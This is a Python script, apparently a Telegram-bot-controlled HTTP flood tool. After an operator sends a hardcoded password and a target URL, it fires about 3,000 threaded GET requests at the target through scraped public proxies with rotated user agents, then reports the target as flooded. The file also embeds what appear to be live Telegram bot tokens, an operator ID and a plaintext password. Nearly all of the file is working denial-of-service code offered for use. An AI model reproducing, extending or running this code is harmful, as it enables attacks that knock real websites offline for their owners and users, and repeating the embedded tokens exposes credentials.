import os, time, requests, threading, random
from http.server import HTTPServer, BaseHTTPRequestHandler

# MASTER AND SLAVE TOKENS CONFIGURATION
MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_TOKENS = [
    "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0",
    "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE",
    "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI"
]

MASTER_ID = 1938591484

class HealthCheck(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"SOVEREIGN_SINGLE_CORE_ACTIVE")
    def do_HEAD(self):
        self.send_response(200); self.end_headers()

def run_health_check():
    server_address = ('0.0.0.0', 10000)
    httpd = HTTPServer(server_address, HealthCheck)
    httpd.serve_forever()

class SovereignMasterCore:
    def __init__(self, m_token, s_tokens):
        self.m_token, self.s_tokens = m_token, s_tokens
        self.user_states, self.authenticated = {}, False
        self.api_url = f"https://api.telegram.org/bot{m_token}"
        self.proxies = []
        self._load_proxies()
        self._notify(MASTER_ID, "🔱 MASTER CORE ONLINE\n📡 SINGLE SECURITY LAYER ACTIVE.")

    def _load_proxies(self):
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10)
            self.proxies = [p for p in res.text.split('\r\n') if p]
        except: self.proxies = []

    def _notify(self, chat_id, text):
        try: requests.post(f"{self.api_url}/sendMessage", json={'chat_id': chat_id, 'text': text})
        except: pass

    def _execute_request(self, target):
        headers = {'User-Agent': random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X)"])}
        px_addr = random.choice(self.proxies) if self.proxies else None
        proxy = {"http": f"http://{px_addr}", "https": f"http://{px_addr}"} if px_addr else None
        try: requests.get(target, headers=headers, proxies=proxy, timeout=5)
        except: pass

    def _launch_coordinated_strike(self, target):
        self._notify(MASTER_ID, f"🚀 INITIATING MAX STRIKE: {target}")
        all_units = self.s_tokens + [self.m_token]
        
        def strike_worker():
            strike_threads = []
            for token in all_units:
                for _ in range(500): # ২৫০০+ প্যারালাল হিট লজিক
                    t = threading.Thread(target=self._execute_request, args=(target,))
                    t.start()
                    strike_threads.append(t)
            for t in strike_threads: t.join(timeout=0.05)
            self._notify(MASTER_ID, "🔱 STRIKE COMPLETE. TARGET FLOODED SUCCESSFULLY.")

        threading.Thread(target=strike_worker, daemon=True).start()
        self._notify(MASTER_ID, "💀 SYSTEM RUNNING AT FULL CAPACITY.")

    def listen(self):
        offset = 0
        while True:
            try:
                updates = requests.get(f"{self.api_url}/getUpdates?offset={offset}&timeout=15").json()
                for update in updates.get('result', []):
                    offset = update['update_id'] + 1
                    message = update.get('message', {})
                    uid = message.get('from', {}).get('id')
                    text = message.get('text', '')
                    
                    if uid != MASTER_ID: continue
                    
                    state = self.user_states.get(uid, 0)
                    if text == "/start":
                        self._notify(uid, "WELCOME MASTER. ENTER MASTER KEY TO UNLOCK.")
                        self.user_states[uid] = "WAIT_KEY"
                    elif state == "WAIT_KEY" and text == "Aip2k3052":
                        self.user_states[uid] = "ROOT"; self.authenticated = True
                        self._notify(uid, "🔓 ACCESS GRANTED. SEND TARGET LINK.")
                    elif self.authenticated and "http" in text:
                        self._launch_coordinated_strike(text)
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    threading.Thread(target=run_health_check, daemon=True).start()
    SovereignMasterCore(MASTER_TOKEN, SLAVE_TOKENS).listen()
    
